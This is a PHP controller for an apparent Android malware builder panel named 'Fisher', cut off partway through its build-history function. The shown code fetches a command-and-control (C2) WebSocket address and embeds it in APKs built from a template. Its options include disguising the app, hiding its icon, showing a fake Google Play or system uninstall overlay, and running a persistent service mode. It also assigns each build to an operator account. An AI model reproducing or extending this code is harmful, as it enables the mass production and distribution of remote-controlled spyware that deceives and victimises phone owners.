<?php
namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;
use think\facade\Env;

class ApkController extends BaseController
{
    // APK 输出目录（构建好的 APK 放这里）
    private string $apkOutDir;
    // APK 源文件和打包脚本都在 extend 目录
    private string $apkSrc;

    public function __construct()
    {
        $this->apkOutDir = root_path() . 'runtime' . DIRECTORY_SEPARATOR . 'apk_output';
        $this->apkSrc = root_path() . 'extend' . DIRECTORY_SEPARATOR . 'source.apk';
    }

    private function currentActor(): array
    {
        $request = request();
        $payload = $request->user ?? $request->userPayload ?? [];
        $query = Db::table('fisher_users');
        if (!empty($payload['user_id'])) {
            $query->where('id', (int)$payload['user_id']);
        } elseif (!empty($payload['id'])) {
            $query->where('id', (int)$payload['id']);
        } elseif (!empty($payload['username'])) {
            $query->where('username', (string)$payload['username']);
        } else {
            return [];
        }

        $row = $query->find();
        return $row ?: [];
    }

    private function isSuperAdmin(array $actor): bool
    {
        return in_array($actor['role'] ?? '', ['superadmin', 'super-admin'], true);
    }

    /**
     * null 表示超级管理员可查看全部构建；普通管理员可查看自己及直属子账号；普通账号只看自己。
     */
    private function managedBuildOwners(array $actor): ?array
    {
        $children = [];
        if (!$this->isSuperAdmin($actor) && ($actor['role'] ?? 'user') === 'admin') {
            $username = trim((string)($actor['username'] ?? ''));
            if ($username !== '') {
                $children = Db::table('fisher_users')
                    ->where('parent_username', $username)
                    ->column('username');
            }
        }
        return $this->composeBuildOwnerScope($actor, $children);
    }

    private function composeBuildOwnerScope(array $actor, array $children = []): ?array
    {
        if ($this->isSuperAdmin($actor)) return null;
        $username = trim((string)($actor['username'] ?? ''));
        if ($username === '') return [];
        if (($actor['role'] ?? 'user') !== 'admin') return [$username];
        return array_values(array_unique(array_filter(array_merge([$username], $children), 'strlen')));
    }

    private function applyBuildScope($query, array $actor)
    {
        $owners = $this->managedBuildOwners($actor);
        if ($owners !== null) {
            $query->whereIn('owner_username', $owners ?: ['__no_authorized_build_owner__']);
        }
        return $query;
    }

    private function canUseBuildOwner(array $actor, string $ownerUsername): bool
    {
        if ($ownerUsername === '') return false;
        $owners = $this->managedBuildOwners($actor);
        return $owners === null || in_array($ownerUsername, $owners, true);
    }

    private function findAuthorizedBuild(int $buildId, ?array $actor = null): ?array
    {
        if ($buildId <= 0) return null;
        $actor = $actor ?? $this->currentActor();
        if (!$actor) return null;
        $query = Db::table('fisher_apk_builds')->where('id', $buildId);
        return $this->applyBuildScope($query, $actor)->find() ?: null;
    }

    private function countBuildsByStatus(string $status, array $actor): int
    {
        $query = Db::table('fisher_apk_builds')->where('status', $status);
        return (int)$this->applyBuildScope($query, $actor)->count();
    }

    /**
     * 返回 valid=true/false；校验组件不可用时 valid=null，避免把已有任务误判为失败。
     */
    private function inspectApkArtifact(string $filePath): array
    {
        if (!is_file($filePath)) {
            return ['valid' => false, 'size' => 0, 'reason' => '构建产物不存在'];
        }
        $size = (int)@filesize($filePath);
        if ($size < 1024 * 1024) {
            return ['valid' => false, 'size' => $size, 'reason' => '构建产物过小'];
        }

        $hasManifest = false;
        $hasDex = false;
        if (class_exists('ZipArchive')) {
            $zip = new \ZipArchive();
            $opened = $zip->open($filePath, \ZipArchive::CHECKCONS);
            if ($opened !== true) {
                return ['valid' => false, 'size' => $size, 'reason' => 'APK ZIP 完整性校验失败'];
            }
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $name = (string)$zip->getNameIndex($i);
                if ($name === 'AndroidManifest.xml') $hasManifest = true;
                if (preg_match('/^classes(?:\d+)?\.dex$/', $name)) $hasDex = true;
            }
            $zip->close();
        } elseif (function_exists('exec')) {
            $output = [];
            $code = 1;
            @exec('unzip -tqq ' . escapeshellarg($filePath) . ' 2>&1', $output, $code);
            if ($code !== 0) {
                return ['valid' => false, 'size' => $size, 'reason' => 'APK ZIP 完整性校验失败'];
            }
            $entries = [];
            @exec('unzip -Z1 ' . escapeshellarg($filePath) . ' 2>/dev/null', $entries, $code);
            if ($code !== 0) {
                return ['valid' => null, 'size' => $size, 'reason' => '无法读取 APK 目录'];
            }
            foreach ($entries as $name) {
                if ($name === 'AndroidManifest.xml') $hasManifest = true;
                if (preg_match('/^classes(?:\d+)?\.dex$/', (string)$name)) $hasDex = true;
            }
        } else {
            return ['valid' => null, 'size' => $size, 'reason' => '服务器缺少 APK 校验组件'];
        }

        if (!$hasManifest || !$hasDex) {
            return ['valid' => false, 'size' => $size, 'reason' => 'APK 缺少 Manifest 或 DEX'];
        }
        return ['valid' => true, 'size' => $size, 'reason' => 'APK 结构完整'];
    }

    private function rs(): string
    {
        return substr(md5(uniqid(mt_rand(), true)), 0, 8);
    }

    // 打包状态（内存缓存，实际用 settings 表持久化）
    private function getBuildState(): array
    {
        // 优先检查 bat 异步写入的状态文件
        $statusFile = runtime_path() . 'apk_build_status.json';
        if (file_exists($statusFile)) {
            $fileState = @json_decode(file_get_contents($statusFile), true);
            if (is_array($fileState) && isset($fileState['is_building']) && !$fileState['is_building']) {
                // 异步构建完成，同步到数据库，并把已产出的 APK 任务从排队/构建中纠正为完成
                $merged = array_merge($this->defaultState(), $fileState);
                $this->syncFinishedBuildFromState($merged);
                $this->saveBuildState($merged);
                @unlink($statusFile);
                return $merged;
            }
        }
        $state = Db::table('fisher_settings')->where('key', 'apk_build_state')->value('value');
        if ($state) {
            $decoded = json_decode($state, true);
            if (is_array($decoded)) {
                // 如果 is_building=true，检查是否需要自动重置
                if (!empty($decoded['is_building'])) {
                    $taskFile = runtime_path() . 'apk_build_task.json';
                    $logFile = runtime_path() . 'apk_build.log';
                    // 任务文件已不存在（被Node.js读取）且超过2分钟 → 视为完成或超时
                    $startedAt = (int)($decoded['_start_time'] ?? 0);
                    $isStale = $startedAt > 0 && (time() - $startedAt) > 600;
                    $shouldReset = $isStale;
                    if (!$shouldReset && !file_exists($taskFile)) {
                        // 检查状态文件是否有完成标记
                        $statusFile = runtime_path() . 'apk_build_status.json';
                        if (file_exists($statusFile)) {
                            $shouldReset = true; // 有状态文件说明已完成
                        } elseif (file_exists($logFile) && time() - filemtime($logFile) > 120) {
                            $shouldReset = true; // 日志超过2分钟没更新
                        } elseif (!file_exists($logFile) && time() - ($decoded['_start_time'] ?? time()) > 120) {
                            $shouldReset = true; // 无日志文件且超过2分钟
                        }
                    }
                    if ($shouldReset) {
                        $decoded['is_building'] = false;
                        $decoded['progress'] = 0;
                        $decoded['message'] = '构建超时，已自动释放锁';
                        $decoded['logs'] = array_merge($decoded['logs'] ?? [], ['[' . date('H:i:s') . '] 构建超时，自动释放锁']);
                        $this->saveBuildState($decoded);
                    }
                }
                return array_merge($this->defaultState(), $decoded);
            }
        }
        return $this->defaultState();
    }

    private function saveBuildState(array $state): void
    {
        $json = json_encode($state, JSON_UNESCAPED_UNICODE);
        $exists = Db::table('fisher_settings')->where('key', 'apk_build_state')->find();
        if ($exists) {
            Db::table('fisher_settings')->where('key', 'apk_build_state')->update(['value' => $json]);
        } else {
            Db::table('fisher_settings')->insert(['key' => 'apk_build_state', 'value' => $json]);
        }
    }

    private function markBuildDone(array $row, ?int $fileSize = null): array
    {
        $filename = basename((string)($row['filename'] ?? ''));
        if ($filename === '') {
            return $row;
        }

        $filePath = $this->apkOutDir . DIRECTORY_SEPARATOR . $filename;
        $inspection = $this->inspectApkArtifact($filePath);
        if ($inspection['valid'] !== true) {
            if ($inspection['valid'] === false) {
                $failed = [
                    'status' => 'failed',
                    'progress' => 0,
                    'file_size' => (int)$inspection['size'],
                    'message' => '构建产物校验失败: ' . $inspection['reason'],
                ];
                try {
                    Db::table('fisher_apk_builds')->where('id', (int)($row['id'] ?? 0))->update($failed);
                } catch (\Throwable $e) {
                    error_log('[APK Build] mark invalid failed: ' . $e->getMessage());
                }
                return array_merge($row, $failed, ['filename' => $filename]);
            }
            return $row;
        }

        $size = $fileSize ?? (int)$inspection['size'];
        $update = [
            'status'    => 'done',
            'progress'  => 100,
            'file_size' => $size,
            'message'   => '构建成功: ' . $filename,
        ];

        try {
            if (!empty($row['id'])) {
                Db::table('fisher_apk_builds')->where('id', (int)$row['id'])->update($update);
            } else {
                Db::table('fisher_apk_builds')->where('filename', $filename)->update($update);
            }
        } catch (\Throwable $e) {
            error_log('[APK Build] mark done failed: ' . $e->getMessage());
        }

        return array_merge($row, $update, ['filename' => $filename]);
    }

    private function reconcileBuildRow(array $row): array
    {
        $filename = basename((string)($row['filename'] ?? ''));
        if ($filename === '') {
            return $row;
        }

        $filePath = $this->apkOutDir . DIRECTORY_SEPARATOR . $filename;
        if (!file_exists($filePath)) {
            return $row;
        }

        $status = (string)($row['status'] ?? '');
        $progress = (int)($row['progress'] ?? 0);
        $size = (int)@filesize($filePath);
        if (in_array($status, ['queued', 'building'], true) || $progress < 100 || (int)($row['file_size'] ?? 0) !== $size) {
            return $this->markBuildDone($row, $size);
        }

        return $row;
    }

    private function syncFinishedBuildFromState(array $state): void
    {
        $filename = basename((string)($state['last_output'] ?? $state['lastOutput'] ?? ''));
        if ($filename === '') {
            return;
        }

        $message = (string)($state['message'] ?? '');
        $isSuccess = (int)($state['progress'] ?? 0) >= 100 || strpos($message, '构建成功') !== false;
        if (!$isSuccess) {
            return;
        }

        $row = Db::table('fisher_apk_builds')->where('filename', $filename)->find();
        if ($row) {
            $this->markBuildDone($row);
        }
    }

    private function defaultState(): array
    {
        return [
            'is_building'   => false,
            'progress'      => 0,
            'message'       => '',
            'last_build_at' => '',
            'last_output'   => '',
            'logs'          => [],
        ];
    }

    private function ensureBuildQueueSchema(): void
    {
        static $done = false;
        if ($done) return;
        $done = true;
        try {
            $progress = Db::query("SHOW COLUMNS FROM `fisher_apk_builds` LIKE 'progress'");
            if (!$progress) {
                Db::execute("ALTER TABLE `fisher_apk_builds` ADD COLUMN `progress` INT UNSIGNED NOT NULL DEFAULT 0 AFTER `status`");
            }
            $message = Db::query("SHOW COLUMNS FROM `fisher_apk_builds` LIKE 'message'");
            if (!$message) {
                Db::execute("ALTER TABLE `fisher_apk_builds` ADD COLUMN `message` VARCHAR(255) NOT NULL DEFAULT '' AFTER `progress`");
            }
        } catch (\Throwable $e) {
            error_log('[APK Build] queue schema check failed: ' . $e->getMessage());
        }
    }

    /**
     * 直接读取项目 .env，绕开 ThinkPHP Env 缓存
     * 支持 KEY = value 格式，过滤 # 注释
     */
    private function readEnvVar(string $key): string
    {
        $envFile = root_path() . '.env';
        if (!is_file($envFile)) return '';
        $lines = @file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!$lines) return '';
        $key = strtoupper($key);
        foreach ($lines as $line) {
            $line = trim($line);
            if ($line === '' || $line[0] === '#') continue;
            $eqPos = strpos($line, '=');
            if ($eqPos === false) continue;
            $k = trim(substr($line, 0, $eqPos));
            if (strtoupper($k) !== $key) continue;
            $v = trim(substr($line, $eqPos + 1));
            // 去掉引号包裹
            if (strlen($v) >= 2) {
                $first = $v[0];
                $last = $v[strlen($v) - 1];
                if (($first === '"' && $last === '"') || ($first === "'" && $last === "'")) {
                    $v = substr($v, 1, -1);
                }
            }
            return $v;
        }
        return '';
    }

    /**
     * GET /api/system/c2-host
     * 获取 C2 WebSocket 地址（优先使用当前访问域名，配置文件作为兜底）
     * 前端 APK 构建页面点击"自动获取"时调用
     */
    public function c2Host()
    {
        // 优先使用当前访问后台的域名，避免打包时继续写入旧服务器 IP。
        $c2Host = $this->requestC2WsUrl();

        // 直接读 .env 文本，不依赖 ThinkPHP Env 缓存。
        if ($c2Host === '') {
            $configured = trim($this->readEnvVar('C2_WS_HOST'));
            if ($configured === '') {
                $configured = trim($this->readEnvVar('C2_HOST'));
            }
            $c2Host = $this->normalizeC2WsUrl($configured);
        }

        // 兜底：用 EXTERNAL_HOST + EXTERNAL_PORT 拼接。
        if ($c2Host === '') {
            $extHost = trim($this->readEnvVar('EXTERNAL_HOST'));
            $extPort = trim($this->readEnvVar('EXTERNAL_PORT'));
            if ($extHost !== '') {
                $c2Host = $this->normalizeC2WsUrl(
                    'ws://' . $extHost . ($extPort !== '' ? ':' . $extPort : '')
                );
            }
        }
        return json([
            'success' => true,
            'data' => [
                'c2_host' => $c2Host,
            ],
            'message' => 'success',
        ]);
    }

    /** 根据当前请求生成客户端 WebSocket 地址。 */
    private function requestC2WsUrl(): string
    {
        $rawHost = trim((string)($_SERVER['HTTP_X_FORWARDED_HOST'] ?? $_SERVER['HTTP_HOST'] ?? ''));
        if (strpos($rawHost, ',') !== false) {
            $rawHost = trim(explode(',', $rawHost, 2)[0]);
        }
        if ($rawHost === '' || preg_match('/[\\s\\/\\\\]/', $rawHost)) {
            return '';
        }

        $host = (string)parse_url('http://' . $rawHost, PHP_URL_HOST);
        if ($host === '') {
            return '';
        }

        $forwardedProto = strtolower(trim((string)($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '')));
        if (strpos($forwardedProto, ',') !== false) {
            $forwardedProto = trim(explode(',', $forwardedProto, 2)[0]);
        }
        $https = strtolower(trim((string)($_SERVER['HTTPS'] ?? '')));
        $cfVisitor = strtolower((string)($_SERVER['HTTP_CF_VISITOR'] ?? ''));
        $secure = ($https !== '' && $https !== 'off' && $https !== '0')
            || $forwardedProto === 'https'
            || strpos($cfVisitor, '"scheme":"https"') !== false;

        // 正式域名始终使用 TLS；直接用 IP 调试时保留 ws。
        $scheme = ($secure || filter_var($host, FILTER_VALIDATE_IP) === false) ? 'wss' : 'ws';
        return $this->normalizeC2WsUrl($scheme . '://' . $rawHost);
    }

    /** 将 http(s)/ws(s) 配置统一为客户端所需的 ws(s)://host 基础地址。 */
    private function normalizeC2WsUrl(string $value): string
    {
        $value = trim($value);
        if ($value === '') {
            return '';
        }

        $value = preg_replace('#^https://#i', 'wss://', $value);
        $value = preg_replace('#^http://#i', 'ws://', $value);
        if (!preg_match('#^wss?://#i', $value)) {
            $value = 'wss://' . ltrim($value, '/');
        }

        $parts = parse_url($value);
        if (!is_array($parts) || empty($parts['host'])) {
            return '';
        }

        $scheme = strtolower((string)($parts['scheme'] ?? 'wss'));
        if ($scheme !== 'ws' && $scheme !== 'wss') {
            $scheme = 'wss';
        }
        $host = (string)$parts['host'];
        if (strpos($host, ':') !== false && substr($host, 0, 1) !== '[') {
            $host = '[' . $host . ']';
        }
        $port = isset($parts['port']) ? ':' . (int)$parts['port'] : '';
        return $scheme . '://' . $host . $port;
    }

    /**
     * GET /api/apk/info
     * 获取源 APK 信息
     */
    public function apkInfo()
    {
        $region = Request::get('region', 'global');

        return json([
            'success' => true,
            'data' => [
                'region'       => $region,
                'regionLabel'  => $region === 'cn' ? '国内版' : '国外版',
                'packageName'  => 'com.grand.secure.gold',
                'versionName'  => '24.2.365',
                'versionCode'  => 240565,
                'appName'      => 'Fisher',
                'serverUrl'    => '',
                'webUrl'       => '',
                'ownerUsername' => '',
                'apkExists'    => file_exists($this->apkSrc),
                'templatePath' => $this->apkSrc,
            ],
            'message' => 'success',
        ]);
    }

    /**
     * POST /api/apk/build
     * 触发 APK 打包
     */
    public function apkBuild()
    {
        $this->ensureBuildQueueSchema();
        $actor = $this->currentActor();
        if (!$actor) {
            return json(['success' => false, 'message' => '登录状态无效'], 401);
        }
        $activeBuilds = Db::table('fisher_apk_builds')->whereIn('status', ['queued', 'building'])->count();
        if ($activeBuilds >= 50) {
            return json(['success' => false, 'message' => '构建队列已满，请稍后再试'], 429);
        }

        $state = $this->getBuildState();
        $data = Request::post();
        $serverUrl = $data['serverUrl'] ?? $data['server_url'] ?? '';
        $webUrl = $data['webUrl'] ?? $data['web_url'] ?? '';
        $appName = trim($data['appName'] ?? $data['app_name'] ?? 'Fisher');
        $ownerUsername = trim((string)($data['ownerUsername'] ?? $data['owner_username'] ?? ''));
        if ($ownerUsername === '') {
            $ownerUsername = trim((string)($actor['username'] ?? ''));
        }
        if (!$this->canUseBuildOwner($actor, $ownerUsername)) {
            return json(['success' => false, 'message' => '无权为该账号创建构建任务'], 403);
        }
        if (!Db::table('fisher_users')->where('username', $ownerUsername)->find()) {
            return json(['success' => false, 'message' => '构建归属账号不存在'], 400);
        }

        $contentType = strtolower((string)($_SERVER['CONTENT_TYPE'] ?? ''));
        if (!str_starts_with($contentType, 'multipart/form-data')) {
            return json(['success' => false, 'message' => '构建请求格式错误，请从构建页面重新提交'], 400);
        }
        $serverUrl = $this->normalizeC2WsUrl((string)$serverUrl);
        if ($serverUrl === '') {
            return json(['success' => false, 'message' => '服务器地址不能为空'], 400);
        }
        $iconUpload = request()->file('appIcon');
        $bgUpload = request()->file('backgroundImage');
        if (!$iconUpload || !$bgUpload) {
            return json(['success' => false, 'message' => '请同时上传应用图标和背景图'], 400);
        }
        if (method_exists($iconUpload, 'getError') && $iconUpload->getError()) {
            return json(['success' => false, 'message' => '应用图标上传失败'], 400);
        }
        if (method_exists($bgUpload, 'getError') && $bgUpload->getError()) {
            return json(['success' => false, 'message' => '背景图上传失败'], 400);
        }

        $nameError = $this->validateAppName($appName);
        if ($nameError) {
            return json(['success' => false, 'message' => $nameError], 400);
        }

        if (!$this->isSuperAdmin($actor)) {
            $existing = Db::table('fisher_app_owner_map')->where('app_name', $appName)->find();
            if ($existing && $existing['owner_username'] !== $ownerUsername) {
                return json(['success' => false, 'message' => "应用名 \"{$appName}\" 已被用户 {$existing['owner_username']} 使用"], 409);
            }
        }

        $prefix = strtoupper(substr(preg_replace('/[^a-zA-Z]/', '', $appName ?: 'GNI'), 0, 3)) ?: 'GNI';
        $outputFilename = $prefix . '_' . date('Ymd_His') . '_' . $this->rs() . '.apk';

        $state['is_building'] = true;
        $state['progress'] = 3;
        $state['message'] = '任务已加入构建队列';
        $state['logs'] = ['[' . date('H:i:s') . '] 已加入构建队列 ' . $appName];
        $state['_start_time'] = time();
        $state['_output_filename'] = $outputFilename;
        $this->saveBuildState($state);

        $buildQueued = false;
        $buildId = 0;
        register_shutdown_function(function () use (&$buildQueued, &$buildId, $state) {
            if ($buildQueued) return;
            $failedState = $state;
            $failedState['is_building'] = false;
            $failedState['progress'] = 0;
            $failedState['message'] = '构建请求异常终止，已自动释放锁';
            $failedState['logs'] = array_merge($failedState['logs'] ?? [], ['[' . date('H:i:s') . '] 请求异常终止，自动释放锁']);
            try {
                $this->saveBuildState($failedState);
                if ($buildId > 0) {
                    Db::table('fisher_apk_builds')->where('id', $buildId)->update(['status' => 'failed', 'progress' => 0, 'message' => '构建请求异常终止']);
                }
            } catch (\Throwable $ignored) {
            }
        });

        try {
            if (!is_dir($this->apkOutDir)) {
                mkdir($this->apkOutDir, 0755, true);
            }

            $pythonScript = root_path() . 'extend' . DIRECTORY_SEPARATOR . 'build_apk.py';
            $outputPath = $this->apkOutDir . '/' . $outputFilename;
            $packageName = $data['packageName'] ?? $data['package_name'] ?? '';
            $pageStyleConfig = $data['pageStyleConfig'] ?? '';
            $loadingTips = $data['loadingTips'] ?? '';
            $configMaskText = $data['configMaskText'] ?? '';
            $configMaskSubtitle = $data['configMaskSubtitle'] ?? '';
            $enableConfigMask = $data['enableConfigMask'] ?? '1';
            $showAppIcon = $data['showAppIcon'] ?? '1';
            $uninstallMode = $data['uninstallMode'] ?? '0';
            $uninstallStyle = $data['uninstallStyle'] ?? $data['uninstall_style'] ?? 'googleplay';
            if (!in_array($uninstallStyle, ['googleplay', 'system'], true)) {
                $uninstallStyle = 'googleplay';
            }
            $enableServiceMode = $data['enableServiceMode'] ?? '0';

            $psc = [];
            if ($pageStyleConfig) {
                $psc = is_string($pageStyleConfig) ? json_decode($pageStyleConfig, true) ?: [] : $pageStyleConfig;
            }
            $psc['_configMaskText'] = $configMaskText ?: ($psc['_configMaskText'] ?? '');
            $psc['_configMaskSubtitle'] = $configMaskSubtitle ?: ($psc['_configMaskSubtitle'] ?? '');
            $psc['_enableConfigMask'] = $enableConfigMask === '1' ? 'true' : 'false';
            $psc['_showAppIcon'] = $showAppIcon === '1' ? 'true' : 'false';
            $psc['_uninstallMode'] = $uninstallMode === '1' ? 'true' : 'false';
            $psc['_uninstallStyle'] = $uninstallStyle;
            $psc['_enableServiceMode'] = $enableServiceMode === '1' ? 'true' : 'false';
            if ($loadingTips) {
                $psc['_loadingTips'] = $loadingTips;
            }
            if ($ownerUsername) {
                $psc['_ownerUsername'] = $ownerUsername;
            }

            $assetsDir = runtime_path() . 'apk_assets' . DIRECTORY_SEPARATOR;
            if (!is_dir($assetsDir)) {
                mkdir($assetsDir, 0755, true);
            }
            $iconPath = '';
            $bgPath = '';
            $persistIconPath = '';
            $persistBgPath = '';
            $debugLog = runtime_path() . 'apk_upload_debug.log';
            $debugInfo = date('Y-m-d H:i:s') . " === APK BUILD REQUEST ===\n";
            $debugInfo .= "  _FILES: " . json_encode($_FILES, JSON_UNESCAPED_UNICODE) . "\n";
            $debugInfo .= "  appName: " . ($data['appName'] ?? 'N/A') . "\n";
            file_put_contents($debugLog, $debugInfo, FILE_APPEND);

            try {
                $icon = request()->file('appIcon');
                if ($icon) {
                    $tmpPath = $icon->getRealPath() ?: $icon->getPathname();
                    $iconPath = runtime_path() . 'apk_icon_' . time() . '_' . $this->rs() . '.png';
                    $persistIconPath = $assetsDir . 'icon_' . date('Ymd_His') . '_' . $this->rs() . '.png';
                    if ($tmpPath && file_exists($tmpPath)) {
                        copy($tmpPath, $iconPath);
                        copy($tmpPath, $persistIconPath);
                    }
                }
            } catch (\Throwable $e) {
                $iconPath = '';
                $persistIconPath = '';
                file_put_contents($debugLog, "  ICON EXCEPTION: " . $e->getMessage() . "\n", FILE_APPEND);
            }
            try {
                $bg = request()->file('backgroundImage');
                if ($bg) {
                    $tmpPath = $bg->getRealPath() ?: $bg->getPathname();
                    $bgPath = runtime_path() . 'apk_bg_' . time() . '_' . $this->rs() . '.png';
                    $persistBgPath = $assetsDir . 'bg_' . date('Ymd_His') . '_' . $this->rs() . '.png';
                    if ($tmpPath && file_exists($tmpPath)) {
                        copy($tmpPath, $bgPath);
                        copy($tmpPath, $persistBgPath);
                    }
                }
            } catch (\Throwable $e) {
                $bgPath = '';
                $persistBgPath = '';
                file_put_contents($debugLog, "  BG EXCEPTION: " . $e->getMessage() . "\n", FILE_APPEND);
            }

            $encrypt = false;
            $buildId = Db::table('fisher_apk_builds')->insertGetId([
                'filename'       => $outputFilename,
                'server_url'     => $serverUrl,
                'web_url'        => $webUrl,
                'app_name'       => $appName,
                'status'         => 'queued',
                'progress'       => 1,
                'message'        => '排队中，等待构建线程',
                'owner_username' => $ownerUsername,
                'created_at'     => time(),
            ]);

            $queueDir = runtime_path() . 'apk_build_queue' . DIRECTORY_SEPARATOR;
            if (!is_dir($queueDir)) {
                mkdir($queueDir, 0755, true);
            }
            $taskFile = $queueDir . sprintf('%013d_%06d_%s.json', (int)(microtime(true) * 1000), $buildId, $this->rs());
            $taskJson = json_encode([
                'buildId'         => $buildId,
                'record_id'       => $buildId,
                'pythonScript'    => $pythonScript,
                'serverUrl'       => $serverUrl,
                'webUrl'          => $webUrl,
                'appName'         => $appName,
                'packageName'     => $packageName,
                'outputPath'      => $outputPath,
                'outputFilename'  => $outputFilename,
                'config'          => json_encode($psc, JSON_UNESCAPED_UNICODE),
                'iconPath'        => $iconPath,
                'bgPath'          => $bgPath,
                'encrypt'         => $encrypt ? true : false,
                'createdAt'       => time(),
            ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            if ($taskJson === false || file_put_contents($taskFile, $taskJson, LOCK_EX) === false) {
                throw new \RuntimeException('无法写入 APK 构建任务文件');
            }

            if ($appName && $ownerUsername) {
                $existing = Db::table('fisher_app_owner_map')->where('app_name', $appName)->find();
                if ($existing) {
                    Db::table('fisher_app_owner_map')->where('app_name', $appName)->update([
                        'owner_username' => $ownerUsername,
                        'updated_at' => date('Y-m-d H:i:s'),
                    ]);
                } else {
                    Db::table('fisher_app_owner_map')->insert([
                        'app_name' => $appName,
                        'owner_username' => $ownerUsername,
                        'created_at' => date('Y-m-d H:i:s'),
                        'updated_at' => date('Y-m-d H:i:s'),
                    ]);
                }
            }

            $versionName = $data['versionName'] ?? $data['version_name'] ?? '';
            $uninstallOverlayTexts = $data['uninstallOverlayTexts'] ?? $data['uninstall_overlay_texts'] ?? '';
            Db::table('fisher_apk_build_configs')->insert([
                'build_id'              => $buildId,
                'filename'              => $outputFilename,
                'server_url'            => $serverUrl,
                'web_url'               => $webUrl,
                'app_name'              => $appName,
                'package_name'          => $packageName,
                'version_name'          => $versionName,
                'enable_config_mask'    => ($enableConfigMask === '1') ? 1 : 0,
                'enable_service_mode'   => ($enableServiceMode === '1') ? 1 : 0,
                'show_app_icon'         => ($showAppIcon === '1') ? 1 : 0,
                'uninstall_mode'        => ($uninstallMode === '1') ? 1 : 0,
                'uninstall_style'       => $uninstallStyle,
                'config_mask_text'      => $configMaskText,
                'config_mask_subtitle'  => $configMaskSubtitle,
                'page_style_config'     => is_string($pageStyleConfig) ? $pageStyleConfig : json_encode($pageStyleConfig, JSON_UNESCAPED_UNICODE),
                'loading_tips'          => is_string($loadingTips) ? $loadingTips : json_encode($loadingTips, JSON_UNESCAPED_UNICODE),
                'uninstall_overlay_texts' => is_string($uninstallOverlayTexts) ? $uninstallOverlayTexts : json_encode($uninstallOverlayTexts, JSON_UNESCAPED_UNICODE),
                'icon_path'             => $persistIconPath,
                'bg_path'               => $persistBgPath,
                'owner_username'        => $ownerUsername,
                'created_at'            => date('Y-m-d H:i:s'),
            ]);

            $buildQueued = true;
            return json([
                'success' => true,
                'data' => [
                    'filename' => $outputFilename,
                    'buildId'  => $buildId,
                    'status'   => 'queued',
                ],
                'message' => '任务已加入构建队列',
            ]);
        } catch (\Throwable $e) {
            $state['is_building'] = false;
            $state['progress'] = 0;
            $state['message'] = '构建任务创建失败: ' . $e->getMessage();
            $state['logs'] = array_merge($state['logs'] ?? [], ['[' . date('H:i:s') . '] 任务创建失败: ' . $e->getMessage()]);
            try {
                $this->saveBuildState($state);
            } catch (\Throwable $ignored) {
            }
            error_log('[APK Build] task creation failed: ' . $e->getMessage());
            return json(['success' => false, 'message' => '构建任务创建失败，请查看服务器日志'], 500);
        }
    }

    /**
     * GET /api/apk/build-status
     * 获取打包状态
     */
    public function apkBuildStatus()
    {
        $this->ensureBuildQueueSchema();
        $actor = $this->currentActor();
        if (!$actor) {
            return json(['success' => false, 'message' => '登录状态无效'], 401);
        }
        $state = $this->getBuildState();
        $buildId = (int)Request::get('buildId', 0);
        if ($buildId > 0) {
            $latest = $this->findAuthorizedBuild($buildId, $actor);
            if (!$latest) {
                return json(['success' => false, 'message' => '构建任务不存在'], 404);
            }
        } else {
            $query = Db::table('fisher_apk_builds');
            $latest = $this->applyBuildScope($query, $actor)->order('created_at', 'desc')->find();
        }
        if (!$latest && !$this->isSuperAdmin($actor)) {
            $state = $this->defaultState();
        }
        $queuePosition = 0;
        if ($latest) {
            $latest = $this->reconcileBuildRow($latest);
            $status = (string)($latest['status'] ?? '');
            if ($status === 'queued') {
                $queuePosition = Db::table('fisher_apk_builds')
                    ->where('status', 'queued')
                    ->where('created_at', '<=', (int)($latest['created_at'] ?? 0))
                    ->count();
            }
            if (in_array($status, ['queued', 'building'], true)) {
                $state['is_building'] = true;
                $state['progress'] = max(1, min(99, (int)($latest['progress'] ?? $state['progress'] ?? 1)));
                $state['message'] = (string)($latest['message'] ?? ($status === 'queued' ? '排队中' : '构建中'));
                $state['last_output'] = (string)($latest['filename'] ?? $state['last_output'] ?? '');
            } elseif (in_array($status, ['done', 'failed'], true)) {
                $state['is_building'] = false;
                $state['progress'] = $status === 'done' ? 100 : (int)($latest['progress'] ?? 0);
                $state['message'] = $status === 'done'
                    ? ('构建成功: ' . ($latest['filename'] ?? ''))
                    : ((string)($latest['message'] ?? '构建失败'));
                $state['last_output'] = $status === 'done' ? (string)($latest['filename'] ?? '') : '';
            }
        }

        return json([
            'success'        => true,
            'isBuilding'     => $state['is_building'],
            'is_building'    => $state['is_building'],
            'progress'       => $state['progress'],
            'message'        => $state['message'],
            'lastBuildAt'    => $state['last_build_at'],
            'lastOutput'     => $state['last_output'],
            'buildId'        => $latest['id'] ?? 0,
            'status'         => $latest['status'] ?? '',
            'queuePosition'  => $queuePosition,
            'queue_position' => $queuePosition,
            'summary'        => [
                'queued'   => $this->countBuildsByStatus('queued', $actor),
                'building' => $this->countBuildsByStatus('building', $actor),
                'done'     => $this->countBuildsByStatus('done', $actor),
                'failed'   => $this->countBuildsByStatus('failed', $actor),
            ],
        ]);
    }

    /**
     * GET /api/apk/build-logs
     * 获取打包日志
     */
    public function apkBuildLogs()
    {
        $actor = $this->currentActor();
        if (!$actor) {
            return json(['success' => false, 'message' => '登录状态无效'], 401);
        }
        if (!$this->isSuperAdmin($actor)) {
            $query = $this->applyBuildScope(Db::table('fisher_apk_builds'), $actor);
            $latest = $query->order('created_at', 'desc')->find();
            $logs = $latest ? [sprintf('[%s] %s', date('H:i:s', (int)($latest['created_at'] ?? time())), (string)($latest['message'] ?? ''))] : [];
            return json(['success' => true, 'logs' => $logs]);
        }
        $state = $this->getBuildState();
        return json(['success' => true, 'logs' => $state['logs'] ?? []]);
    }

    /**
     * GET /api/apk/build-history
     * 打包历史
     */
    public function apkBuildHistory()
    {
        $this->ensureBuildQueueSchema();
        $actor = $this->currentActor();
        if (!$actor) {
            return json(['success' => false, 'message' => '登录状态无效'], 401);
        }
        $query = $this->applyBuildScope(Db::table('fisher_apk_builds'), $actor);
        $rows = $query->order('created_at', 'desc')->limit(50)->select()->toArray();

        $records = [];
        foreach ($rows as $r) {
            $records[] = [
                'id'          => $r['id'],
                'fileName'    => $r['filename'],
                'filename'    => $r['filename'],
                'serverUrl'   => $r['server_url'] ?? '',
                'webUrl'      => $r['web_url'] ?? '',
                'appName'     => $r['app_name'] ?? '',
